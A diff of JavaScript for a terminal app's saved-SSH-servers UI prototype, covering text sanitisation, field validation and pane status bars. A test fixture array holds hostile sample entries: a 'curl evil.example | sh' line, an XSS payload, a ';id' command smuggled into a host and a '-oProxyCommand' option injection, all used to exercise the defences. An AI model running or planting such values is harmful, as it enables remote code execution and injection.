+  ["One Dark", "#282c34", "#21252b", "#2c313a", "#333842", "#3e4451", "#abb2bf", "#9da5b4", "#5c6370", "#61afef", "#3B73A9", "#98c379", "#e06c75", "#e5c07b", "rgba(171, 178, 191, 0.1)", "rgba(171, 178, 191, 0.15)"],
+];
+const VARS = ["--bg-primary", "--bg-secondary", "--bg-tertiary", "--bg-elevated", "--bg-surface", "--text-primary", "--text-secondary", "--text-muted", "--accent", "--accent-solid", "--green", "--red", "--yellow", "--border", "--border-strong"];
+
+const $ = (s, r = document) => r.querySelector(s);
+const $$ = (s, r = document) => [...r.querySelectorAll(s)];
+const win = $("#win"), tabbar = $("#tabbar"), panesEl = $("#panes"), layerEl = $("#layer"), toastsEl = $("#toasts"), sayEl = $("#say"), logEl = $("#log"), capEl = $("#cap"), fbEl = $("#fb"), scratchEl = $("#scratch");
+
+/* ==================================================================
+   Text Better Terminal did not write (spec 9): the cleaning rule of the alerts proposal, section B5, used unchanged.
+   No control or direction character is written in this file: every one is built from its code point.
+   ================================================================== */
+const cp = String.fromCodePoint;
+const cls = (ranges) => ranges.map((r) => (Array.isArray(r) ? `\\u{${r[0].toString(16)}}-\\u{${r[1].toString(16)}}` : `\\u{${r.toString(16)}}`)).join("");
+const E = "\\u{1b}";
+/* 1. Removed: every default-ignorable code point (Unicode's own property for characters that draw nothing: soft hyphen, zero-width space,
+      direction marks, embeddings, overrides and isolates, word joiner, invisible operators, the byte-order mark, the combining grapheme joiner,
+      tag characters, and the unassigned ones reserved for the same use), plus the interlinear annotation marks.
+      Three kinds are decided one by one: fillers go to step 3; a joiner or a variation selector stays only next to a character it acts on. */
+const RE_IGNORABLE = new RegExp(`[\\p{Default_Ignorable_Code_Point}${cls([[0xFFF9, 0xFFFB]])}]`, "u");
+const FILLER = new Set([0x115F, 0x1160, 0x3164, 0xFFA0]);
+const isVS = (c) => (c >= 0xFE00 && c <= 0xFE0F) || (c >= 0xE0100 && c <= 0xE01EF) || (c >= 0x180B && c <= 0x180D) || c === 0x180F;
+/* The scripts that use U+200C and U+200D: the cursive ones and the Indic ones. Between letters of any other script they act on nothing. */
+const JOINING = ["Arabic", "Syriac", "Mandaic", "Mongolian", "Nko", "Phags_Pa", "Adlam", "Hanifi_Rohingya", "Devanagari", "Bengali", "Gurmukhi", "Gujarati", "Oriya", "Tamil", "Telugu", "Kannada", "Malayalam", "Sinhala", "Myanmar", "Khmer", "Tibetan", "Balinese", "Javanese"];
+const RE_JOINS = new RegExp(`^(?=[\\p{L}\\p{M}])[${JOINING.map((x) => `\\p{scx=${x}}`).join("")}]$`, "u");
+const RE_EMOJI = new RegExp("^[\\p{Extended_Pictographic}\\p{Emoji_Modifier}]$", "u");
+const RE_PICT = new RegExp("^\\p{Extended_Pictographic}$", "u");
+const RE_BASE = new RegExp("^[^\\s\\p{Cc}\\p{Default_Ignorable_Code_Point}]$", "u");
+function dropIgnorable(s) {
+  const a = Array.from(s), out = [];
+  for (let i = 0; i < a.length; i++) {
+    const ch = a[i], c = ch.codePointAt(0), prev = out[out.length - 1], next = a[i + 1];
+    if (FILLER.has(c)) { out.push(ch); continue; }
+    if (c === 0x200C || c === 0x200D) {
+      const joins = prev && next && RE_JOINS.test(prev) && RE_JOINS.test(next);                                                       // between two letters or marks of a script that uses it
+      const emoji = c === 0x200D && prev && next && (RE_EMOJI.test(prev) || prev.codePointAt(0) === 0xFE0F) && RE_PICT.test(next);    // between two emoji
+      if (joins || emoji) out.push(ch);
+      continue;
+    }
+    if (isVS(c)) { if (prev && RE_BASE.test(prev)) out.push(ch); continue; }                                                          // straight after a visible character, once
+    if (RE_IGNORABLE.test(ch)) continue;
+    out.push(ch);
+  }
+  return out.join("");
+}
+/* 2. Terminal escape sequences, removed whole, so no "[31m" is left behind. A string sequence (OSC, DCS, APC, PM, SOS) counts only when its
+      terminator comes within 256 characters; without one only its introducer goes, so an unterminated sequence cannot take the rest of the message. */
+const ST = `(?:\\u{7}|${E}\\\\|\\u{9c})`;
+const RE_SEQ = new RegExp(
+  `(?:${E}[\\]P_^X]|[\\u{9d}\\u{90}\\u{9f}\\u{9e}\\u{98}])[^\\u{7}\\u{1b}\\u{9c}]{0,256}?${ST}` +   // OSC (title, hyperlink), DCS, APC, PM, SOS, with the payload
+  `|(?:${E}\\[|\\u{9b})[\\u{30}-\\u{3f}]*[\\u{20}-\\u{2f}]*[\\u{40}-\\u{7e}]?` +                    // CSI (colours, cursor moves), also one cut off before its final byte
+  `|${E}[\\u{20}-\\u{2f}]*[\\u{30}-\\u{7e}]`, "gu");                                               // any other escape pair, and the introducer of an unterminated string sequence
+/* 3. Replaced by a space: acts as a break, or draws as a blank without being white space. */
+const SPACED = [[0x00, 0x1F], [0x7F, 0x9F], [0x2028, 0x2029], [0x115F, 0x1160], 0x2800, 0x3164, 0xFFA0, 0xFFFC, 0x1D159];
+const RE_SPACED = new RegExp(`[${cls(SPACED)}]`, "gu");
+/* 4. More than four combining marks in a row: the rest are dropped (they draw outside the line). A joiner between marks does not restart the count. */
+const JV = cls([0x200C, 0x200D]);
+const RE_MARKRUN = new RegExp(`(?:\\p{M}[${JV}]*){5,}`, "gu");
+const RE_TRAILJ = new RegExp(`[${JV}]+$`, "u");
+const RE_MARK = new RegExp("\\p{M}", "u");
+const capMarks = (run) => { let k = 0, out = ""; for (const ch of run) { if (RE_MARK.test(ch) && ++k > 4) break; out += ch; } return out.replace(RE_TRAILJ, ""); };
+/* 5. No grapheme keeps more than 12 code points, so a cap counted in graphemes is also a cap in code points (24 graphemes: 288 at most). */
+const seg = typeof Intl !== "undefined" && Intl.Segmenter ? new Intl.Segmenter(undefined, { granularity: "grapheme" }) : null;
+const capG = (g) => { const a = Array.from(g); return a.length > 12 ? a.slice(0, 12).join("").replace(RE_TRAILJ, "") : g; };
+const graphemes = (s) => (seg ? [...seg.segment(s)].map((x) => capG(x.segment)) : Array.from(s));
+/* 7. Nothing visible left (only white space, marks or format characters): the caller's placeholder is used. */
+const RE_VISIBLE = new RegExp("[^\\s\\p{Cc}\\p{Cf}\\p{M}\\p{Default_Ignorable_Code_Point}]", "u");
+function cleanText(raw) {
+  let s = String(raw ?? "");
+  if (s.toWellFormed) s = s.toWellFormed();            // 0. a lone surrogate becomes U+FFFD
+  s = dropIgnorable(s).replace(RE_SEQ, "").replace(RE_SPACED, " ").replace(RE_MARKRUN, capMarks);
+  s = graphemes(s).join("").replace(/\s+/gu, " ").trim();   // 5, then 6: every run of white space is one space
+  return RE_VISIBLE.test(s) ? s : "";
+}
+const DOTS = cp(0x2026);
+/** A name: cleaned, then cut in the middle at 24 graphemes (13 + ellipsis + 10), so a shared start or end still tells two names apart. */
+function cleanName(raw, fallback = "Untitled tab") {
+  const s = cleanText(raw);
+  if (!s) return fallback;
+  const g = graphemes(s);
+  return g.length > 24 ? g.slice(0, 13).join("") + DOTS + g.slice(-10).join("") : s;
+}
+/** The whole cleaned name for a tooltip, end-cut at 200. */
+function fullName(raw, fallback = "Untitled tab") {
+  const g = graphemes(cleanText(raw) || fallback);
+  return g.length > 200 ? g.slice(0, 199).join("") + DOTS : g.join("");
+}
+/** Body text: cleaned as a whole, end-cut at 500 graphemes. */
+function cleanBody(raw, fallback = "No details were given.") {
+  const s = cleanText(raw);
+  if (!s) return fallback;
+  const g = graphemes(s);
+  return g.length > 500 ? g.slice(0, 499).join("") + DOTS : s;
+}
+
+
+
+/* ---------- small DOM helpers: text is always set as text, never as markup ---------- */
+function h(tag, props, ...kids) {
+  const n = document.createElement(tag);
+  for (const k in props || {}) {
+    const v = props[k];
+    if (v == null || v === false) continue;
+    if (k === "class") n.className = v; else if (k === "on") for (const e in v) n.addEventListener(e, v[e]); else n.setAttribute(k, v === true ? "" : v);
+  }
+  for (const kid of kids.flat()) if (kid != null && kid !== false) n.append(kid);
+  return n;
+}
+const NS = "http://www.w3.org/2000/svg";
+function svg(vb, cls, shapes, label) {
+  const s = document.createElementNS(NS, "svg");
+  s.setAttribute("viewBox", vb); s.setAttribute("fill", "none"); if (cls) s.setAttribute("class", cls);
+  if (label) { s.setAttribute("role", "img"); s.setAttribute("aria-label", label); } else s.setAttribute("aria-hidden", "true");
+  for (const [tag, attrs] of shapes) { const e = document.createElementNS(NS, tag); for (const k in attrs) e.setAttribute(k, attrs[k]); s.append(e); }
+  return s;
+}
+const SK = { stroke: "currentColor", "stroke-width": "1.3", "stroke-linecap": "round", "stroke-linejoin": "round" };
+/* The remote mark's glyph: a server box. connecting: a dashed, empty box. live: a solid box with its two lights on. ended: a solid box struck through. plain: the list's own icon, no state. */
+function srvIcon(state, label) {
+  const box = ["rect", { class: "box", x: "1.5", y: "2.5", width: "11", height: "9", rx: "1.5", ...SK }];
+  const mid = ["path", { d: "M1.5 7h11", ...SK }];
+  const lights = [["circle", { cx: "4", cy: "4.8", r: "1", fill: "currentColor" }], ["circle", { cx: "4", cy: "9.2", r: "1", fill: "currentColor" }]];
+  const shapes = state === "connecting" ? [box] : state === "live" ? [box, mid, ...lights] : state === "ended" ? [box, mid, ["path", { d: "M1.2 13.2L12.8 0.8", ...SK, "stroke-width": "1.7" }]] : [box, mid];
+  const s = svg("0 0 14 14", "srv-ico", shapes, label); s.dataset.state = state; return s;
+}
+const warnIcon = (cls = "ico") => svg("0 0 16 16", cls, [["path", { d: "M8 2.2L14.5 13.5H1.5L8 2.2Z", ...SK }], ["path", { d: "M8 6.5V9.6", ...SK }], ["circle", { cx: "8", cy: "11.6", r: ".8", fill: "currentColor" }]]);
+const infoIcon = (cls = "ico") => svg("0 0 16 16", cls, [["rect", { x: "2", y: "2", width: "12", height: "12", rx: "2.5", ...SK }], ["path", { d: "M8 7.4V11.4", ...SK }], ["circle", { cx: "8", cy: "5", r: ".8", fill: "currentColor" }]]);
+const stopIcon = (cls = "ico") => svg("0 0 16 16", cls, [["path", { d: "M5.4 1.8h5.2l3.6 3.6v5.2l-3.6 3.6H5.4L1.8 10.6V5.4L5.4 1.8Z", ...SK }], ["path", { d: "M5.8 5.8l4.4 4.4M10.2 5.8l-4.4 4.4", ...SK }]]);
+const chevIcon = () => svg("0 0 16 16", "chev", [["path", { d: "M5.5 4L9.5 8L5.5 12", stroke: "currentColor", "stroke-width": "1.5", "stroke-linecap": "round", "stroke-linejoin": "round" }]]);
+
+/* ---------- words: one place for every string the design fixes (spec sections 5 to 8) ---------- */
+const STATE_WORDS = { connecting: "starting ssh", live: "ssh running", ended: "ended" };
+const STATE_NAMES = { connecting: "Server, starting ssh", live: "Server, ssh running", ended: "Server, ended" };
+const OS = "macOS";
+const NO_SSH_HELP = { macOS: "macOS ships one at /usr/bin/ssh, so check the PATH your start-up files set.", Linux: "Install your distribution's OpenSSH client package (openssh-client on Debian and Ubuntu, openssh-clients on Fedora, openssh on Arch)." };
+const SSH_STILL_WORKS = "ssh typed in a terminal still works.";
+const WRITE_REFUSED = ["Not sent", "This pane is a server session, and Better Terminal types nothing of its own into one. Use a local pane, or type it there yourself."];
+const IMG_REFUSED = ["Not sent", "Images can't go to a server session: an attached image is sent as a file path on this machine, which means nothing on a server. Remove the images to send the text. Your text is kept."];
+const MSG = {
+  Name: {
+    empty: "Enter a name.",
+    long: "Use 64 characters or fewer.",
+    chars: "Remove the characters that can't be seen. A name can't hold control characters, direction marks, zero-width characters or line breaks.",
+    dup: "Another saved server already has this name. Names are compared without regard to upper and lower case.",
+  },
+  Host: {
+    empty: "Enter a host name, an IP address or an alias from your SSH config.",
+    long: "Use 253 characters or fewer.",
+    user: "Put the user name in the User field, not in Host.",
+    port: "Put the port in the Port field, not in Host.",
+    start: "A host starts with a letter, a digit or a colon.",
+    chars: "Use only letters, digits, dots, hyphens and underscores, or an IPv6 address. No spaces and no other characters.",
+    v6: "This is not a complete IPv6 address. Write it without brackets and without a % zone; \"::\" alone is not accepted. For a link-local address, add an alias in ~/.ssh/config and enter the alias.",
+    v4: "A host of only digits and dots must be four numbers from 0 to 255 with no leading zero, like 192.0.2.7.",
+    hex: "No part of a host can start with 0x.",
+  },
+  Port: { bad: "Enter a whole number from 1 to 65535 with no sign and no leading zero, or leave it empty." },
+  User: {
+    long: "Use 64 characters or fewer.",
+    chars: "Use only letters, digits, dot, underscore, hyphen and @, and don't start with a hyphen. For any other user name, set User under an alias in ~/.ssh/config and enter the alias in Host.",
+  },
+  "Identity file": {
+    path: "Enter a full path that starts with / or ~/.",
+    long: "Use 1024 characters or fewer.",
+    chars: "Use only plain printable characters (ASCII) in the path.",
+    token: "A path can't hold % or ${ here. ssh would expand them. Put such a path in ~/.ssh/config under an alias.",
+  },
+};
+const KEY_WARN = {
+  missing: "No file at this path right now. It is saved as written; ssh will say so when you connect.",
+  notfile: "This path is not a regular file (a folder or a pipe). It is saved as written; ssh will say so when you connect.",
+};
+const FIELDS = [
+  { id: "name", label: "Name", req: true, hint: "Shown on the tab and in the command palette. 1 to 64 characters.", ph: "db1" },
+  { id: "host", label: "Host", req: true, mono: true, hint: "A host name, an IPv4 or IPv6 address, or an alias from ~/.ssh/config.", ph: "db1.example.com" },
+  { id: "port", label: "Port", mono: true, hint: "Empty: ssh's default or your SSH config decides.", ph: "" },
+  { id: "user", label: "User", mono: true, hint: "Empty: your SSH config or your local user name decides.", ph: "" },
+  { id: "key", label: "Identity file", mono: true, wide: true, hint: "A path only, starting with / or ~/. Better Terminal never opens the file and stores no password or passphrase: ssh asks for those in the pane.", ph: "~/.ssh/id_ed25519" },
+];
+
+/* ---------- the rules of SV-1 AC1, as a stand-in. In the build there is one implementation, in Rust; the form asks it (spec 4.4). ---------- */
+const norm = (s) => s.normalize("NFC").toLowerCase();
+function isV4(s) { return /^[0-9]+([.][0-9]+){3}$/.test(s) && s.split(".").every((p) => (p === "0" || !p.startsWith("0")) && Number(p) <= 255); }
+function isV6(s) {
+  if (!/^[0-9A-Fa-f:.]+$/.test(s)) return false;
+  const halves = s.split("::"); if (halves.length > 2) return false;
+  const grp = (x) => (x === "" ? [] : x.split(":"));
+  const all = grp(halves[0]).concat(halves.length === 2 ? grp(halves[1]) : []);
+  let n = 0;
+  for (let i = 0; i < all.length; i++) { const g = all[i]; if (g.includes(".")) { if (i !== all.length - 1 || !isV4(g)) return false; n += 2; } else { if (!/^[0-9A-Fa-f]{1,4}$/.test(g)) return false; n++; } }
+  return halves.length === 2 ? n < 8 : n === 8;
+}
+const RE_NAME_BAD = new RegExp("[\\p{Cc}\\p{Cf}\\p{Zl}\\p{Zp}]", "u");
+function check(v, selfId, list) {
+  const out = {}; const name = v.name.trim(), host = v.host, port = v.port.trim(), user = v.user, key = v.key;
+  if (!name) out.Name = "empty"; else if ([...name].length > 64) out.Name = "long"; else if (RE_NAME_BAD.test(name)) out.Name = "chars";
+  else if (list.some((s) => s.id !== selfId && norm(s.name) === norm(name))) out.Name = "dup";
+  if (!host) out.Host = "empty"; else if (host.length > 253) out.Host = "long"; else if (host.includes("@")) out.Host = "user";
+  else if (/^[^:\[\]]+:[0-9]+$/.test(host)) out.Host = "port"; else if (/[\[\]%]/.test(host)) out.Host = "v6";
+  else if (!/^[A-Za-z0-9:]/.test(host)) out.Host = "start"; else if (!/^[A-Za-z0-9._:-]+$/.test(host)) out.Host = "chars";
+  else if (host.includes(":")) { if (!isV6(host) || host === "::") out.Host = "v6"; }
+  else if (/^[0-9.]+$/.test(host)) { if (!isV4(host)) out.Host = "v4"; }
+  else if (host.split(".").some((p) => /^0x/i.test(p))) out.Host = "hex";
+  if (port && (!/^[1-9][0-9]{0,4}$/.test(port) || Number(port) > 65535)) out.Port = "bad";
+  if (user) { if (user.length > 64) out.User = "long"; else if (!/^[A-Za-z0-9._@-]+$/.test(user) || user.startsWith("-")) out.User = "chars"; }
+  if (key) { if (!(key.startsWith("/") || key.startsWith("~/"))) out["Identity file"] = "path"; else if (key.length > 1024) out["Identity file"] = "long"; else if (/[^ -~]/.test(key)) out["Identity file"] = "chars"; else if (key.includes("%") || key.includes("${")) out["Identity file"] = "token"; }
+  return out;
+}
+const keyWarnFor = (key) => (!key ? null : /missing/.test(key) ? "missing" : /fifo|\/$/.test(key) ? "notfile" : null);
+const badField = (s, list) => Object.keys(check({ name: s.name, host: s.host, port: s.port == null ? "" : String(s.port), user: s.user || "", key: s.key || "" }, s.id, list))[0] || null;
+
+/* ---------- destination summary (SV-9 AC1) and how it is shown (spec 9) ---------- */
+const destOf = (s) => ({ user: s.user || null, host: s.host, port: s.port || null, key: s.key || null });
+const sameDest = (a, b) => a.user === b.user && a.host === b.host && a.port === b.port && a.key === b.key;
+function summary(d) { const hst = d.port && d.host.includes(":") ? "[" + d.host + "]" : d.host; return (d.user ? d.user + "@" : "") + hst + (d.port ? ":" + d.port : ""); }
+const TAIL = 26, HEAD = 14;
+function cutDest(text) { const g = graphemes(text); if (g.length <= TAIL + 3) return ["", g.join("")]; let hd = g.slice(0, g.length - TAIL); if (hd.length > HEAD + 1) hd = hd.slice(0, HEAD).concat(DOTS); return [hd.join(""), g.slice(-TAIL).join("")]; }
+function fullDest(d) { const g = graphemes(cleanText(summary(d)) || "(no host)"); return g.length > 400 ? g.slice(0, 399).join("") + DOTS : g.join(""); }
+function destEl(d) {
+  const full = fullDest(d), [hd, tl] = cutDest(full);
+  return h("bdi", { class: "dest", title: full }, hd && h("span", { class: "hd" }, hd), h("span", { class: "tl" }, tl));
+}
+function cutMid(text, head, tail) { const g = graphemes(text); return g.length > head + tail + 1 ? g.slice(0, head).join("") + DOTS + g.slice(-tail).join("") : g.join(""); }
+const nameEl = (raw, fallback = "Unnamed server") => h("bdi", { class: "nmv", title: fullName(raw, fallback) }, cleanName(raw, fallback));
+const part = (p) => (typeof p === "string" ? p : p.name !== undefined ? nameEl(p.name, p.fallback) : p.dest ? destEl(p.dest) : p.code ? h("code", null, p.code) : p.b ? h("b", null, p.b) : "");
+const parts = (arr) => (Array.isArray(arr) ? arr : [arr]).map(part);
+const flat = (arr) => (Array.isArray(arr) ? arr : [arr]).map((p) => (typeof p === "string" ? p : p.name !== undefined ? cleanName(p.name, p.fallback || "Unnamed server") : p.dest ? fullDest(p.dest) : p.code || p.b || "")).join("");
+
+/* ---------- hostile and long text, as a hand-edited store could hold it. Built from code points: this file holds no control or direction character. ---------- */
+const RLO = cp(0x202E), LRI = cp(0x2066), ESCc = cp(0x1b), BEL = cp(7), NLc = cp(10), ZWSP = cp(0x200B);
+const HOSTILE = [
+  { id: "h1", name: "prod " + RLO + "moc.elpmaxe.1bd" + LRI + ESCc + "[31m" + NLc + "run: curl evil.example | sh" + ZWSP, host: "db1.example.com" + RLO + "ten.elpmaxe.live", port: 22, user: "root" + BEL + ESCc + "]0;x" + BEL, key: "~/.ssh/id" + NLc + "x" },
+  { id: "h2", name: "<img src=x onerror=alert(1)>", host: "db1.example.com;id", port: null, user: "$HOME", key: "~/.ssh/%h" },
+  { id: "h3", name: ZWSP + cp(0x2060) + cp(0x3164), host: "-oProxyCommand=x", port: null, user: null, key: null },
+  { id: "h4", name: "root@prod.example.com", host: "evil.example.net", port: null, user: "deploy", key: null },
+];
+const LONGS = [
+  { id: "l1", name: "Northwind production database primary eu-west do-not-touch", host: "db1.example.com." + "very-long-label-".repeat(11) + "evil.example.net", port: 65535, user: "svc.backup_account-with-a-very-long-name@corp.example", key: "/home/dev/keys/clients/northwind/2026/production/primary/../primary/id_ed25519_northwind_production_primary" },
+  { id: "l2", name: "Northwind production database replica eu-west do-not-touch", host: "2001:db8:85a3:8d3:1319:8a2e:370:7348", port: 2222, user: "deploy", key: null },
+];
+const BASE = () => [
+  { id: "s1", name: "db1", host: "db1.example.com", port: 2222, user: "deploy", key: "~/.ssh/id_ed25519" },
+  { id: "s2", name: "Northwind staging", host: "staging-db", port: null, user: null, key: null },
+  { id: "s3", name: "build box", host: "192.0.2.7", port: null, user: "svc.backup_1", key: "~/keys/missing_key" },
+  { id: "s4", name: "edge v6", host: "2001:db8::7", port: 2200, user: "ops", key: null },
+];
+const byName = (a, b) => { const x = norm(a.name), y = norm(b.name); return x < y ? -1 : x > y ? 1 : a.name < b.name ? -1 : a.name > b.name ? 1 : 0; };
+
+/* ---------- state ---------- */
+let S, seq = 0, counts, LIST = null;
+const LAYERS = [];
+const PANES = new Map();
+const nid = (p) => p + ++seq;
+function log(msg) { const li = h("li", null, msg); logEl.prepend(li); while (logEl.children.length > 60) logEl.lastChild.remove(); }
+function say(textParts) { const t = flat(textParts); sayEl.textContent = ""; sayEl.append(h("span", null, t)); }
+const FAST = () => $("#fast").checked;
+const BOUND = () => (FAST() ? 3000 : 30000);
+const tabOf = (p) => S.tabs.find((t) => t.panes.includes(p));
+const activeTab = () => S.tabs.find((t) => t.id === S.active);
+const activePane = () => { const t = activeTab(); return t && (t.panes.find((p) => p.id === t.activePane) || t.panes[0]); };
+const remoteOf = (t) => t.panes.find((p) => p.remote);
+const isServerTab = (t) => !!(t.serverNamed || remoteOf(t));
+const serverById = (id) => S.servers.find((s) => s.id === id);
+const pname = (p) => serverById(p.remote?.serverId)?.name ?? tabOf(p)?.name ?? "";
+const focusTerm = (p = activePane()) => { if (p) PANES.get(p.id)?.ta.focus(); };
+
+/* ---------- panes ---------- */
+function newPane(o = {}) { return { id: nid("p"), remote: o.remote || null, cwd: o.cwd === undefined ? "~" : o.cwd, lines: o.lines || [], timers: [], confirming: false, refusal: null }; }
+function paneDom(p) {
+  let d = PANES.get(p.id); if (d) return d;
+  const ta = h("textarea", { class: "xterm-helper-textarea", "aria-label": "Terminal input", autocapitalize: "off", spellcheck: "false" });
+  const lines = h("div", { class: "lines" });
+  const term = h("div", { class: "term", on: { mousedown: (e) => { e.preventDefault(); const t = tabOf(p); if (t) { t.activePane = p.id; markActive(t); } ta.focus(); } } }, lines, ta);
+  const head = h("div", { class: "phead" }), bar = h("div", { class: "barslot" });
+  const root = h("div", { class: "pane", role: "group" }, bar, h("div", { class: "pane-in" }, head, term));
+  ta.addEventListener("focus", () => { const t = tabOf(p); if (t && t.activePane !== p.id) { t.activePane = p.id; markActive(t); } });
+  d = { root, head, bar, lines, ta }; PANES.set(p.id, d); return d;
+}
+function markActive(t) { for (const p of t.panes) PANES.get(p.id)?.root.classList.toggle("active", p.id === t.activePane); renderSide(); }
+function putLine(p, text, opts = {}) { p.lines.push({ text, ...opts }); drawLines(p); }
+function drawLines(p) {
+  const d = paneDom(p); d.lines.textContent = "";
+  for (const l of p.lines.slice(-24)) {
+    const ln = h("div", { class: "ln" });
+    if (l.path && !p.remote) ln.append(l.text, h("a", { href: "#", tabindex: "-1", on: { click: (e) => { e.preventDefault(); log("File link clicked: opens " + l.path + " in the code viewer (a local pane, as today)."); } } }, l.path), l.after || "");
+    else ln.append(l.text + (l.path || "") + (l.after || ""));
+    d.lines.append(ln);
+  }
+  if (!p.remote || p.remote.state !== "ended") d.lines.append(h("div", { class: "ln" }, h("span", { class: "cur" })));
+}
+/* What the pane's bar says, for the pane's record (spec 5.3 to 5.6). null: no bar. */
+function barFor(p) {
+  const r = p.remote; if (!r) return null;
+  const tab = tabOf(p), nm = { name: pname(p) };
+  const endBtn = { label: "End what is running", aria: "End what is running in this pane", act: "end", run: () => endPane(p) };
+  if (r.state === "live") return null;
+  if (r.state === "connecting") {
+    if (r.kind === "another") return { tone: "warn", title: "Your shell has not handed over to ssh: another program is running",
+      body: "Your shell's start-up files started another program in this pane in place of ssh, and it is still running. What you type here goes to that program, on this machine. Better Terminal keeps treating this pane as a server session: file links, the folder and its own typing stay off. " + SSH_STILL_WORKS, acts: [endBtn] };
+    if (r.kind === "notyet") return { tone: "warn", title: "Your shell has not handed over to ssh yet",
+      body: "After 30 seconds your shell's start-up files have not handed over to ssh. Whatever is running in this pane is still running. It may be waiting for an answer from you; or ssh may be running under your shell, in which case you can go on using it. Better Terminal treats this pane as a server session meanwhile: file links, the folder and its own typing stay off. " + SSH_STILL_WORKS, acts: [endBtn] };
+    return null;
+  }
+  /* ended */
+  const srv = serverById(r.serverId), cur = srv && destOf(srv), changed = srv && !sameDest(cur, r.dest);
+  const openList = { label: "Open saved servers", act: "list", run: () => openList_() };
+  const rec = srv && { label: "Reconnect", aria: "Reconnect to " + cleanName(srv.name, "Unnamed server") + ", " + fullDest(cur), act: "reconnect", primary: true, run: () => reconnect(p) };
+  const beside = srv && ["to ", { dest: cur }];
+  if (p.refusal && srv) {
+    const f = p.refusal, common = { tone: "warn", beside, acts: [rec] };
+    if (f.kind === "checks") return { ...common, title: ["“", nm, "” can't connect: its " + f.field + " is not valid"], body: "Edit it in your saved servers, then reconnect. Nothing was started.", acts: [rec, openList], beside: null };
+    if (f.kind === "shell") return { ...common, title: "Saved servers need zsh or bash as your login shell", body: (f.shell ? ["Yours is ", { code: f.shell }, ". "] : ["Yours is neither. "]).concat("Nothing was started. ssh typed in a terminal works as before.") };
+    if (f.kind === "unreadable") return { ...common, title: "The server list could not be read", body: "Nothing was started and nothing was changed. Reconnect is off until the list can be read.", acts: [rec, openList], beside: null };
+    if (f.kind === "engagement") return { ...common, title: "Saved servers are not available in an engagement", body: "Nothing was started. ssh typed in a terminal works as before." };
+  }
+  if (!srv) return { tone: "warn", title: "This saved server no longer exists", body: ["It was removed from your saved servers, so this pane can't reconnect. It was last started for ", { dest: r.dest }, ". Its output stays until you close the pane."], acts: [openList] };
+  const keyToo = changed && cur.key !== r.dest.key, withKey = (d) => (keyToo ? { dest: d, key: d.key || "" } : d);
+  if (p.confirming) return { tone: "warn", ask: true, title: ["Connect this pane to a different destination?"], pair: [["It was last started for", withKey(r.dest)], ["It would now connect to", withKey(cur)]],
+    body: ["The saved server “", nm, "” changed since then. Go on only if you expected that."], acts: [{ label: "Cancel", act: "cancel", run: () => { p.confirming = false; updatePane(p, "reconnect"); } }, { label: "Connect to the new destination", act: "confirm", primary: true, run: () => { p.confirming = false; startChecked(p, srv); } }] };
+  if (changed) return { tone: "warn", title: ["The destination of “", { name: srv.name }, "” changed since this pane was last started"], pair: [["Last started for", withKey(r.dest)], ["Reconnect would go to", withKey(cur)]], body: null, acts: [{ ...rec, label: "Reconnect…" }] };
+  if (r.kind === "before") return { tone: "warn", title: "Ended before ssh was seen to start (exit status " + r.status + ")", body: "Better Terminal did not see ssh start in this pane. Your shell ended with exit status " + r.status + "; anything it printed is in the pane. " + SSH_STILL_WORKS, acts: [rec], beside };
+  if (r.kind === "nossh") return { tone: "warn", title: "No SSH client found (exit status 127)", body: "Your shell ended with status 127 before ssh was seen to start, which usually means there is no ssh on its PATH. " + NO_SSH_HELP[OS] + " " + SSH_STILL_WORKS, acts: [rec], beside };
+  if (r.kind === "spawn") return { tone: "warn", title: "Could not start a terminal (system error " + r.status + ")", body: "Better Terminal could not start your shell for this connection, so nothing was run.", acts: [rec], beside };
+  if (r.note === "restored") return { tone: "note", title: "Restored from your last session", body: "ssh is not running here. Nothing reconnects by itself.", acts: [rec], beside };
+  if (r.note === "reopened") return { tone: "note", title: "Reopened tab", body: "ssh is not running here. The earlier output was not kept, and nothing reconnects by itself.", acts: [rec], beside };
+  if (r.note === "byEnd") return { tone: "note", title: "Ended by you", body: "You ended what was running in this pane.", acts: [rec], beside };
+  return { tone: "note", title: r.status == null ? "ssh ended" : "ssh ended (exit status " + r.status + ")", body: null, acts: [rec], beside };
+}
+function updatePane(p, focusAct) {
+  const d = paneDom(p), tab = tabOf(p), r = p.remote;
+  const hadFocus = d.bar.contains(document.activeElement);
+  /* header: the mark takes the folder's place */
+  d.head.textContent = "";
+  if (tab && tab.panes.length > 1) d.head.append(h("span", { class: "pnum" }, String(tab.panes.indexOf(p) + 1)));
+  if (r) {
+    d.head.append(h("span", { class: "chip" }, srvIcon(r.state), "SERVER"), h("span", { class: "pstate" }, STATE_WORDS[r.state]), destEl(r.dest));
+    d.root.setAttribute("aria-label", "Server session " + cleanName(pname(p), "Unnamed server") + ", " + STATE_WORDS[r.state]);
+  } else {
+    if (tab && remoteOf(tab)) d.head.append(h("span", { class: "chip" }, "LOCAL"));
+    d.head.append(h("span", { class: "cwd" }, p.cwd || "~"));
+    d.root.setAttribute("aria-label", "Local pane, " + (p.cwd || "~"));
+  }
+  d.root.classList.toggle("multi", !!tab && tab.panes.length > 1);
+  d.root.classList.toggle("active", !!tab && tab.activePane === p.id);
+  /* bar */
+  const b = barFor(p); d.bar.textContent = "";
+  if (b) {
+    const acts = h("div", { class: "acts" }, b.acts.map((a) => h("button", { type: "button", class: "ui-btn ui-btn--md " + (a.primary ? "ui-btn--primary" : "ui-btn--secondary"), "aria-label": a.aria, "data-act": a.act, on: { mousedown: (e) => e.preventDefault(), click: a.run } }, a.label)), b.beside && h("span", { class: "bd" }, parts(b.beside)));
+    const txt = h("div", { class: "txt" }, h("div", { class: "ttl", id: "bt-" + p.id }, parts(b.title)),
+      b.pair && h("div", { class: "pair" }, b.pair.flatMap(([k, dd]) => [h("span", null, k), h("span", { class: "pairv" }, destEl(dd.dest || dd), dd.dest && h("span", { class: "key", title: cleanText(dd.key) }, dd.key ? "key " + cutMid(cleanText(dd.key), 14, 30) : "no identity file"))])),
+      b.body && h("div", { class: "bd" }, parts(b.body)));
+    d.bar.append(h("div", { class: "srv-bar", role: "group", "aria-labelledby": "bt-" + p.id, "data-tone": b.tone, "data-kind": p.confirming ? "confirm" : p.refusal ? "refused-" + p.refusal.kind : r.kind || r.note || "" }, b.tone === "warn" ? warnIcon() : infoIcon(), txt, acts));
+  }
+  if (hadFocus) (d.bar.querySelector("button") || d.ta).focus();
+  drawLines(p);
+}
+function showTab(id, focus = true) {
+  S.active = id; const t = activeTab();
+  panesEl.textContent = "";
+  for (const p of t.panes) { panesEl.append(paneDom(p).root); updatePane(p); }
+  renderTabs(); renderSide(); if (focus) focusTerm();
+}
+
+/* ---------- tab bar ---------- */
